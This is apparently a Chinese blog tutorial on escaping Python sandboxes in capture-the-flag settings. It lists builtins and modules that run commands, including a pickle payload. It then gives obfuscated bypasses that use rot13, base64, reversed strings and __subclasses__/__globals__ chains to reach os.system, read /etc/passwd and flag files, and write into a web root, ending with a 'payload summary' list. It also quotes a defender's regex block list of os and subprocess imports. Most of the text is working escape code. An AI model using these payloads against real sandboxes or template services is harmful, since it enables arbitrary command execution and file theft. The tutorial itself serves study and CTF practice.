<h6 id="（12）-getattr"><a href="#（12）-getattr" class="headerlink" title="（12）__getattr__"></a>（12）__getattr__</h6><p>当属性查找没有在通常的位置找到属性时调用(例如，它不是实例属性，也不是在类树中找到self)</p>
<h6 id="（13）-name"><a href="#（13）-name" class="headerlink" title="（13）__name__"></a>（13）__name__</h6><p>这个值获得的只是一个字符串，不是模块的引用。</p>
<p>要使用<code>sys.modules[__name__]</code>才获得的是模块的引用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'__main__'</span>]</span><br><span class="line">&lt;module <span class="string">'__main__'</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure>
<h6 id="（14）func-code"><a href="#（14）func-code" class="headerlink" title="（14）func_code"></a>（14）func_code</h6><p>返回表示已编译函数体的代码对象。</p>
<p>function.func_code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line"><span class="meta">... </span>    a=<span class="number">1</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo.func_code</span><br><span class="line">&lt;code object foo at <span class="number">0x7f3a0570d930</span>, file <span class="string">"&lt;stdin&gt;"</span>, line <span class="number">1</span>&gt;</span><br><span class="line">注意：这个代码对象必须存在几个参数</span><br><span class="line"></span><br><span class="line">co_argcount 这个参数是返回该函数的参数</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo.func_code.co_argcount</span><br><span class="line"><span class="number">0</span>    </span><br><span class="line">co_code 返回函数的字节码（可用dis.dis（字节码）将其转换为汇编格式）</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo.func_code.co_code</span><br><span class="line"><span class="string">'d\x01\x00&#125;\x00\x00d\x00\x00S'</span></span><br></pre></td></tr></table></figure>
<h6 id="（15）timeit-模块"><a href="#（15）timeit-模块" class="headerlink" title="（15）timeit 模块"></a>（15）timeit 模块</h6><ul>
<li>这个模块是用来测试代码的执行时间的，能执行代码自然能执行命令</li>
<li>使用前需要导入timeit</li>
</ul>
<p>使用：</p>
<p>timeit(命令，number=1)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> timeit</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>timeit.timeit(<span class="string">"__import__('os').system('dir')"</span>,number=<span class="number">1</span>)</span><br><span class="line">其中命令是字符串的形式</span><br></pre></td></tr></table></figure>
<h6 id="（16）platform-模块"><a href="#（16）platform-模块" class="headerlink" title="（16）platform 模块"></a>（16）platform 模块</h6><p>由名字可以知道这个模块和平台有关，里面的函数主要是为了返回和平台的一些信息，但是我们还是可以调用<br>popen 这个函数执行命令</p>
<p>print platform.popen(‘命令’,mode=’r’,bufsize= -1).read()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">print</span> platform.popen(‘dir’).read()</span><br></pre></td></tr></table></figure>
<h6 id="（17）-globals"><a href="#（17）-globals" class="headerlink" title="（17）__globals__"></a>（17）__globals__</h6><p><code>function.__globals__</code>等同于globals()，dir() 的结果，是上面两个的键值。</p>
<p>在fuzz 中常常和<code>__init__</code>配合使用，<code>__init__</code> 一般跟在类的后面，相当于实例化这个类</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
<h6 id="（18）-call"><a href="#（18）-call" class="headerlink" title="（18）__call__"></a>（18）__call__</h6><p>使实例能够像函数一样被调用<br>x.call 等同于 x()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>func.__call__</span><br><span class="line">&lt;method-wrapper <span class="string">'__call__'</span> of function object at <span class="number">0x7f3a056c7e60</span>&gt;</span><br></pre></td></tr></table></figure>
<h6 id="（19）pickle"><a href="#（19）pickle" class="headerlink" title="（19）pickle"></a>（19）pickle</h6><p>这个是python 的一个序列化的方法，用于将对象存储在字符串对象中，实现对象的持久化</p>
<p>基本的语法：</p>
<p>序列化：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">test=(<span class="string">'this is a test'</span>,<span class="number">3.14</span>,[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">"hh"</span>])</span><br><span class="line">p=pickle.dumps(test)</span><br></pre></td></tr></table></figure></p>
<p>反序列化：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n=pickle.loads(p)</span><br></pre></td></tr></table></figure></p>
<p>我们可以通过 pickle 的方式加载命令<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(<span class="string">b"cos\nsystem\n(S'ls'\ntR."</span>)</span><br></pre></td></tr></table></figure></p>
<h6 id="（20）os、subprocess、commands"><a href="#（20）os、subprocess、commands" class="headerlink" title="（20）os、subprocess、commands"></a>（20）os、subprocess、commands</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">os.system(<span class="string">'ifconfig'</span>)</span><br><span class="line">os.popen(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line">subprocess.call([<span class="string">'ifconfig'</span>],shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>重点说一下subprocess:</p>
<ul>
<li><p>subprocess.run()<br>Python 3.5中新增的函数。执行指定的命令，等待命令执行完成后返回一个包含执行结果的CompletedProcess类的实例。</p>
</li>
<li><p>subprocess.call()<br>执行指定的命令，返回命令执行状态，其功能类似于os.system(cmd)。</p>
</li>
<li><p>subprocess.check_call()<br>Python 2.5中新增的函数。 执行指定的命令，如果执行成功则返回状态码，否则抛出异常。其功能等价于subprocess.run(…, check=True)。</p>
</li>
<li><p>subprocess.check_output()<br>Python 2.7中新增的的函数。执行指定的命令，如果执行状态码为0则返回命令执行结果，否则抛出异常。</p>
</li>
<li><p>subprocess.getoutput(cmd)<br>接收字符串格式的命令，执行命令并返回执行结果，其功能类似于os.popen(cmd).read()和commands.getoutput(cmd)。</p>
</li>
<li><p>subprocess.getstatusoutput(cmd)<br>执行cmd命令，返回一个元组(命令执行状态,命令执行结果输出)，其功能类似于commands.getstatusoutput()。</p>
</li>
</ul>
<h6 id="（21）eval、exec、execfile"><a href="#（21）eval、exec、execfile" class="headerlink" title="（21）eval、exec、execfile"></a>（21）eval、exec、execfile</h6><ul>
<li><p>eval(expression):<br>返回python 表达式执行的结果</p>
</li>
<li><p>exec(source)<br>动态执行python代码。也就是说exec可以执行复杂的python代码，而不像eval函数那样只能计算一个表达式的值。exec函数的返回值永远为None。</p>
</li>
<li><p>execfile(filename)<br>执行一个文件的内容<br>文件是将被解析为python序列的类似于模块的文件</p>
</li>
</ul>
<h6 id="（22）importlib模块"><a href="#（22）importlib模块" class="headerlink" title="（22）importlib模块"></a>（22）importlib模块</h6><p>用法：importlib.import_module(module)</p>
<p>可以代替import</p>
<p>使用importlib库引入os模块<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt; <span class="keyword">import</span> importlib</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test=importlib.import_module(“bf”.decode(‘rot_13’))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>test.system(‘ls’)</span><br></pre></td></tr></table></figure></p>
<h6 id="（23）f修饰符"><a href="#（23）f修饰符" class="headerlink" title="（23）f修饰符"></a>（23）f修饰符</h6><p>在PEP 498中引入了新的字符串类型修饰符：f或F，用f修饰的字符串将可以执行代码。可以参考此文档 <a href="https://www.python.org/dev/peps/pep-0498/" target="_blank" rel="noopener">https://www.python.org/dev/peps/pep-0498/</a></p>
<p>只有在python版本在 3.6.0朝上才有这个方法。简单来说，可以理解为字符串外层套了一个exec()</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">f'<span class="subst">&#123;__import__(“os”).system(“dir”)&#125;</span>’</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="0x03-一些利用及绕过方法"><a href="#0x03-一些利用及绕过方法" class="headerlink" title="0x03 一些利用及绕过方法"></a>0x03 一些利用及绕过方法</h3><h6 id="（1）import-引入禁用模块"><a href="#（1）import-引入禁用模块" class="headerlink" title="（1）import 引入禁用模块"></a>（1）import 引入禁用模块</h6><p>1、对于防御者来说，最常见的方法就是禁止引入敏感的包：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">code = open(<span class="string">'code.py'</span>).read()</span><br><span class="line">pattern  = re.compile(<span class="string">'import\s+(os|commands|subprocess|sys)'</span>)</span><br><span class="line">match = re.search(pattern,code)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"forbidden module import detected"</span></span><br><span class="line">    <span class="keyword">raise</span> Exception</span><br></pre></td></tr></table></figure>
<p>对于攻击者来说，当然就是想尽一切办法绕过过滤引入可以利用的包，引入的方法有：</p>
<ul>
<li>import 关键字</li>
<li><strong>import</strong>函数</li>
<li>importlib库</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 使用__import__</span></span><br><span class="line">lethe = __import__(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>))</span><br><span class="line"><span class="keyword">print</span> lethe.getoutput(<span class="string">'ifconfig'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用importlib库</span></span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">lethe = importlib.import_module(<span class="string">"pbzznaqf"</span>.decode(<span class="string">'rot_13'</span>)</span><br><span class="line"><span class="keyword">print</span> lethe.getoutput(<span class="string">'ifconfig'</span>)</span><br></pre></td></tr></table></figure>
<p>2、在python中,不用引入直接使用的内置函数称为 builtin 函数,随着<code>__builtin__</code>这一个module 自动被引入到环境中。<br>(在python3.x 版本中,<strong>builtin</strong>变成了builtins,而且需要引入)</p>
<p>如果我们把这些函数从<strong>builtin</strong>中删除,那么就不能够再直接使用了。</p>
<p>这时，可以通过reload重新载入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">reload(__builtin__)</span><br></pre></td></tr></table></figure>
<p>但是reload()也是<strong>builtin</strong>下的，如果将它也删了该怎么办呢？</p>
<p>可以通过引入imp模块来进行引入：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> __builtins__</span><br><span class="line"><span class="keyword">import</span> imp</span><br><span class="line">imp.reload(__builtin__)</span><br></pre></td></tr></table></figure></p>
<p>这里之所以要<code>import __builtins__</code>，时因为<strong>builtins</strong>虽然已经被加载，但是它是不可见的，也就时你通过上述两种方式无法找到该模块，dir也不行。引入imp模块的reload函数能够生效的前提是，在最开始有这样的程序语句<code>import __builtins__</code>，这个import的意义并不是把内建模块加载到内存中，因为内建早已经被加载了，它仅仅是让内建模块名在该作用域中可见。</p>
<p>3、python中，如果将模块从<code>sys.modules</code>中删掉之后,就不能再引入了：</p>
<blockquote>
<p>Python import 的步骤<br>python 所有加载的模块信息都存放在 sys.modules 结构中，当 import<br>一个模块时，会按如下步骤来进行 如果是 import A，检查 sys.modules 中是否已经有 A，如果有则不加载，如果没有则为 A<br>创建 module 对象，并加载 A 如果是 from A import B，先为 A 创建 module<br>对象，再解析A，从中寻找B并填充到 A 的 dict 中</p>
</blockquote>
<p>在所有的类unix系统中,Python的os模块的路径几乎都是/usr/lib/python2.7/os.py中<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> sys</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>sys.modules[<span class="string">'os'</span>]=<span class="string">'/usr/lib/python2.7/os.py'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br></pre></td></tr></table></figure></p>
<p>这样就可以通过路径重新载入os模块了。</p>
<p>4、但上述方法中还需要用的sys模块，如果将这些模块也删除了呢？</p>
<p>引入模块的过程,其实总体来说就是把对应模块的代码执行一遍的过程，禁止了引入,我们还是可以执行的,我们知道了对应的路径,我们就可以执行相应的代码。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>execfile(<span class="string">'/usr/lib/python2.7/os.py'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>system(<span class="string">'cat /etc/passwd'</span>)</span><br><span class="line">root:x:<span class="number">0</span>:<span class="number">0</span>:root:/root:/bin/bash</span><br><span class="line">daemon:x:<span class="number">1</span>:<span class="number">1</span>:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:<span class="number">2</span>:<span class="number">2</span>:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:<span class="number">3</span>:<span class="number">3</span>:sys:/dev:/usr/sbin/nologin</span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>getcwd()</span><br><span class="line"><span class="string">'/usr/lib/python2.7'</span></span><br></pre></td></tr></table></figure>
<p>如果execfile函数被禁止,那么还可以使用文件操作打开相应文件然后读入,使用exec来执行代码就可以。</p>
<p>如果防御者直接从文件系统中把相应的包的代码删掉,那无论如何既不能引入也不能执行了，其实对于其他模块,我们还可以手动复制代码直接执行,但是对于类似于 os,sys这样的模块,使用了c模块,使用posix或者nt module来实现,而不是纯python代码,那就没有什么办法了。</p>
<p><br></p>
<h6 id="（2）字符串扫描过滤的绕过"><a href="#（2）字符串扫描过滤的绕过" class="headerlink" title="（2）字符串扫描过滤的绕过"></a>（2）字符串扫描过滤的绕过</h6><p>1、各种编码绕过，如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> base64</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">'__import__'</span>)</span><br><span class="line"><span class="string">'X19pbXBvcnRfXw=='</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>base64.b64encode(<span class="string">'os'</span>)</span><br><span class="line"><span class="string">'b3M='</span></span><br><span class="line"></span><br><span class="line">然后dict引用，就相当于__import__(<span class="string">'os'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">'X19pbXBvcnRfXw=='</span>.decode(<span class="string">'base64'</span>)](<span class="string">'b3M='</span>.decode(<span class="string">'base64'</span>)).system(<span class="string">'dir'</span>)</span><br></pre></td></tr></table></figure>
<p>2、通过逆向字符串绕过</p>
<p>如果过滤的内容是一个dict的key,我们可以用字符串操作,先把他rot13或者base64或者单纯的reverse一下再进去就可以,举个例子:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 假设要读取 a的time属性 : a['time'] ,但是代码中的time字符串全部被过滤了</span></span><br><span class="line">s = <span class="string">"emit"</span></span><br><span class="line">s = s [::<span class="number">-1</span>]</span><br><span class="line"><span class="keyword">print</span> a[s]</span><br></pre></td></tr></table></figure>
<p>但是 ,如果不是键的字符串被过滤了,而是一个关键字或者函数被过滤了呢,比如说,我们已经通过上面的手法,引入了os包,但是代码扫描之中,遇到system或者popen的就直接过滤了,这时候该怎么办呢?</p>
<p>这个时候,就可以利用两个很特殊的函数:<code>getattr</code>和<code>__getattribute__</code>: 这两个函数接受两个参数,一个模组或者对象,第二个是一个字符串,该函数会在模组或者对象下面的域内搜索有没有对应的函数或者属性。</p>
<p>如果某个类定义了 <code>__getattribute__()</code>方法，在 每次引用属性或方法名称时 Python 都调用它（特殊方法名称除外，因为那样将会导致讨厌的无限循环）。<br>语法：<code>object.__getattribute__(self, name)</code></p>
<p>如果某个类定义了 <code>getattr()</code> 方法，Python 将只在正常的位置查询属性时才会调用它。如果实例 x 定义了属性 color， x.color 将 不会 调用x.getattr(‘color’)；而只会返回 x.color 已定义好的值。<br>语法：<code>getattr(object, name[, default])</code></p>
<p>当system被过滤时：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">getattr(__import__(<span class="string">"os"</span>),<span class="string">"flfgrz"</span>.encode(<span class="string">"rot13"</span>))(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">getattr(__import__(<span class="string">"os"</span>),<span class="string">"metsys"</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">"os"</span>).__getattribute__(<span class="string">"metsys"</span>[::<span class="number">-1</span>])(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">__import__(<span class="string">"os"</span>).__getattribute__(<span class="string">"flfgrz"</span>.encode(<span class="string">"rot13"</span>))(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>
<p><br></p>
<h6 id="（3）引入object命令执行"><a href="#（3）引入object命令执行" class="headerlink" title="（3）引入object命令执行"></a>（3）引入object命令执行</h6><p>python的object类中集成了很多的基础函数，我们想要调用的时候也是需要用object去操作的。</p>
<p>注意：python2与python3中的继承链会有不同</p>
<p>比如说字符串对象，通过<code>__mro__</code>方法可打印出其继承关系；通过<code>__bases__</code>方法可以获取上一层继承关系，而如果是多层继承则返回上一层的东西，可能有多个。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__</span><br><span class="line">(&lt;type ‘object’&gt;,)</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">""</span>.__class__.__mro__</span><br><span class="line">(&lt;type ‘str’&gt;, &lt;type ‘basestring’&gt;, &lt;type ‘object’&gt;)</span><br></pre></td></tr></table></figure>
<p>这是最常见的创建object对象的两个方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>”.__class__.__mro__[<span class="number">2</span>]</span><br><span class="line">&lt;type <span class="string">'object'</span>&gt;</span><br></pre></td></tr></table></figure>
<p>在获取之后，可以通过<code>__subclasses__()</code>获取其所有子类，并且可以通过索引进行访问。</p>
<p>1、如在python2中<code>__subclasses__()[40]</code>即是file类型的object。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type ‘file’&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>”.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type ‘file’&gt;</span><br></pre></td></tr></table></figure>
<p>可以利用其进行读文件：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">"/flag"</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">40</span>](<span class="string">"/flag"</span>).read()</span><br></pre></td></tr></table></figure>
<p>2、如果要执行命令可以找subclasses下引入过os模块的模块。</p>
<p>例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br></pre></td></tr></table></figure>
<p>3、或者是调用过危险函数eval的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">61</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br></pre></td></tr></table></figure>
<p>4、还要注意一下这个<code>linecache</code>模块， 这是一个模块用于读取文件的模块，其中自带了os，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dir(().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">"func_globals"</span>)[<span class="string">"linecache"</span>])</span><br><span class="line"></span><br><span class="line">[<span class="string">'__all__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'cache'</span>, <span class="string">'checkcache'</span>, <span class="string">'clearcache'</span>, <span class="string">'getline'</span>, <span class="string">'getlines'</span>, <span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'updatecache'</span>]</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="0x04-常见逃逸思路"><a href="#0x04-常见逃逸思路" class="headerlink" title="0x04 常见逃逸思路"></a>0x04 常见逃逸思路</h3><p>当函数被禁用时，就要通过一些类中的关系来引用被禁用的函数。一些常见的寻找特殊模块的方式如下所示:</p>
<ul>
<li><code>__class__</code>:获得当前对象的类</li>
<li><code>__bases__</code> :列出其基类</li>
<li><code>__mro__</code> :列出解析方法的调用顺序，类似于bases</li>
<li><code>__subclasses__()</code>：返回子类列表</li>
<li><code>__dict__</code> ： 列出当前属性/函数的字典</li>
<li>func_globals：返回一个包含函数全局变量的字典引用</li>
</ul>
<p>一些payload总结：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 利用file()函数读取文件：（写类似）</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'./test.py'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 执行系统命令：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新载入__builtins__：</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">r'C:\1.php'</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/input'</span>, <span class="string">'w'</span>).write(<span class="string">'123'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#执行任意命令</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls  /var/www/html").read()'</span> )</span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 __getattibute__ 方法</span></span><br><span class="line"></span><br><span class="line">x = [x <span class="keyword">for</span> x <span class="keyword">in</span> [].__class__.__base__.__subclasses__() <span class="keyword">if</span> x.__name__ == <span class="string">'ca'</span>+<span class="string">'tch_warnings'</span>][<span class="number">0</span>].__init__</span><br><span class="line">x.__getattribute__(<span class="string">"func_global"</span>+<span class="string">"s"</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'l'</span>+<span class="string">'s'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">### 上述命令需要通过哦 exec 或者别的命令执行函数执行</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">py2 [<span class="number">58</span>] &lt;<span class="class"><span class="keyword">class</span> '<span class="title">warnings</span>.<span class="title">catch_warnings</span>'&gt; 对应 <span class="title">py3</span> [157]</span></span><br><span class="line"><span class="class"><span class="params">()</span>.<span class="title">__class__</span>.<span class="title">__bases__</span>[0].<span class="title">__subclasses__</span><span class="params">()</span>[157]<span class="params">()</span>.<span class="title">_module</span>.<span class="title">__builtins__</span>['<span class="title">__import__</span>']<span class="params">(<span class="string">"os"</span>)</span>.<span class="title">system</span><span class="params">(<span class="string">"ls"</span>)</span></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">推荐的另外一个类</span></span><br><span class="line"><span class="class">''.<span class="title">__class__</span>.<span class="title">__mro__</span>[1].<span class="title">__subclasses__</span><span class="params">()</span>[104].<span class="title">__init__</span>.<span class="title">__globals__</span>["<span class="title">sys</span>"].<span class="title">modules</span>["<span class="title">os</span>"].<span class="title">system</span><span class="params">(<span class="string">"cat FLAG"</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>].system(<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">60</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'_    _import__("os").system("ls")'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">61</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">'_    _import__("os").system("ls")'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">40</span>](filename).read()</span><br><span class="line"></span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls")'</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_globals'</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'sys'</span>].modules[<span class="string">'os'</span>].popen(<span class="string">'ls'</span>).read()</span><br></pre></td></tr></table></figure>
<p><br></p>
<h3 id="0x05-一些小trick"><a href="#0x05-一些小trick" class="headerlink" title="0x05 一些小trick"></a>0x05 一些小trick</h3><p>1、完整过滤整个匹配语句我们只要使用变量替换的方式绕过</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = open</span><br><span class="line">print(a(<span class="string">"/etc/passwd"</span>).read())</span><br></pre></td></tr></table></figure>
<p>2、函数名后面加点空格换一行都能执行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">print</span> open</span><br><span class="line">(<span class="string">"/etc/passwd"</span>).read()</span><br></pre></td></tr></table></figure>
<p>3、使用第三方库的执行命令的函数</p>
<p>如果程序中调用了第三方的库，恰好这个库有执行命令的函数，那么肯定是再好不过了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> numpy.distutils.exec_command <span class="keyword">import</span> _exec_command <span class="keyword">as</span> system</span><br><span class="line">system(<span class="string">"ls /"</span>)</span><br></pre></td></tr></table></figure>
<p>4、使用别名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os <span class="keyword">as</span> o</span><br></pre></td></tr></table></figure>
<p>5、字符串拼接</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">"l"</span>+<span class="string">"s"</span></span><br><span class="line"><span class="string">"func_global"</span>+<span class="string">"s"</span></span><br></pre></td></tr></table></figure>
<p><br></p>
<p>总结：python沙盒绕过的知识点多而杂，且非常灵活，也是python后端SSTI的基础，还需要慢慢学习积累。</p>
<p><br></p>
